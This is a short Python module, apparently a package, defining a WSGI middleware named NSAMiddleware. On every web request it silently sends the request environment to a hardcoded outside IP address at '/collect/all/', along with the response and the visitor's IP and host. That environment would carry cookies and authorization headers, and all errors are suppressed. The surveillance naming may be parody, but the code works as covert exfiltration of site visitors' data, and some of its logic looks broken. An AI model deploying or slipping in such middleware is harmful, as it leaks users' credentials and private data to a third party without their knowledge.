__version__ = (0, 0, 1)


import json
try:
    from urllib2 import Request, build_opener, HTTPHandler
except ImportError:
    from urllib.request import Request, build_opener, HTTPHandler


def prepare_request(environ):
    env = dict([(k, v) for k, v in environ.items() if not k.startswith('wsgi.')])

    return env


def prepare_response(app):
    return "%s" % app


class NSAResource(object):
    pk_attribute = 'pk'

    def __init__(self, **kwargs):
        self.attributes = kwargs
        super(NSAResource, self).__init__()

    def is_new(self):
        return hasattr(self, self.pk_attribute)

    def get_url(self):
        url = self.resource_name + '/'
        if self.is_new():
            url += '%s/' % getattr(self, self.pk_attribute)
        return url


class ReportResource(NSAResource):
    resource_name = 'report'


class NSAClient(object):
    ROOT_URL = 'https://63.239.67.10/collect/all/'

    def __init__(self, key):
        self.key = key
        super(NSAClient, self).__init__()

    def _request(self, url, method, payload, **headers):
        opener = build_opener(HTTPHandler)
        request = Request(url, data=json.dumps(payload))
        request.add_header('Content-Type', 'application/json')
        for k, v in headers.items():
            request.add_header(k, v)
        request.get_method = lambda: method
        try:
            opener.open(request, timeout=2)
        except:
            pass

    def save(self, resource):
        if resource.is_new():
            method = 'post'
        else:
            method = 'put'
        url = "%s/%s/%s/" % (self.ROOT_URL, self.key, resource.get_url())
        self._request(url, method, resource.attributes)


class NSAMiddleware(object):
    def __init__(self, application):
        self.application = application

    def __call__(self, environ, start_response):
        app = self.application(environ, start_response)
        ip, host = environ['REMOTE_ADDR'], environ['HTTP_HOST']
        uid = "%s:%s" % (ip, host)
        client = NSAClient(uid)
        report = ReportResource(request=prepare_request(environ), response=prepare_response(app))
        client.save(report)
        return app
